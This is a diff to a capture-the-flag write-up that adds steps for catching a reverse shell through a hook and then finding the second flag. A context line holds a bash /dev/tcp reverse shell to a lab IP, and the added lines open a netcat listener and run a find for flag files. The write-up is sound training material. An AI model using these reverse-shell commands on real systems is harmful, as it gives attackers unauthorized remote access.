@@ -116,6 +116,35 @@ bash -i >& /dev/tcp/10.8.174.98/4444 0>&1`
 ![image](https://user-images.githubusercontent.com/86648102/134910323-c2859f53-3897-449b-ab14-f31e75317abb.png)
 
 
+Also, open a netcat listener on port 4567.
+
+`sudo nc -nvlp 4567`
+
+![image](https://user-images.githubusercontent.com/86648102/134913265-87d883c4-11b5-4db8-acfe-f309bba16147.png)
+
+We need to do some sort of action, for the hook to activate the reverse shell. Creating a new file, will do just fine:
+
+![image](https://user-images.githubusercontent.com/86648102/134913438-3e4cd6b8-a7ac-4ae8-a3de-1f2ddd0b46c2.png)
+
+We got the shell.
+
+![image](https://user-images.githubusercontent.com/86648102/134913596-3b2ebc47-d1c3-44c8-8b37-f0395568bc6a.png)
+
+By searching for flag files, we get the 2nd flag:
+
+`find / -type f -iname flag2* 2>/dev/null`
+
+![image](https://user-images.githubusercontent.com/86648102/134913989-f240b007-1c98-419f-823e-e2ecfca0c505.png)
+
+
+
+
+
+
+
+
+
+
 
 
 
